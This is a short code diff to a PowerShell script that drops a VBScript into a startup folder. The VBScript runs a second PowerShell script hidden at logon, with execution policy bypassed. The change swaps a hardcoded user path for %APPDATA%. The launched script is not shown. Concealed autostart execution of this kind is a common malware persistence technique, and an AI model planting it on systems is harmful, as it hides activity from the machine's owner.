@@ -18,16 +18,12 @@ $vbsPath = Join-Path $startupPath "RunHidden.vbs"
 $vbsContent = @'
 Dim objShell
 Set objShell = CreateObject("Wscript.Shell")
-
-' Path to your PowerShell script
-psScript = "C:\Users\PRINCI\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\code2.ps1"
-
-' Command to run PowerShell hidden
+appData = objShell.ExpandEnvironmentStrings("%APPDATA%")
+psScript = appData & "\Microsoft\Windows\Start Menu\Programs\code2.ps1"
 cmd = "powershell.exe -ExecutionPolicy Bypass -File """ & psScript & """"
-
-' 0 = hidden, False = don't wait
 objShell.Run cmd, 0, False
 '@
+
 
 Set-Content -Path $vbsPath -Value $vbsContent -Force
 $cscript = "cscript.exe //nologo `"$vbsPath`""
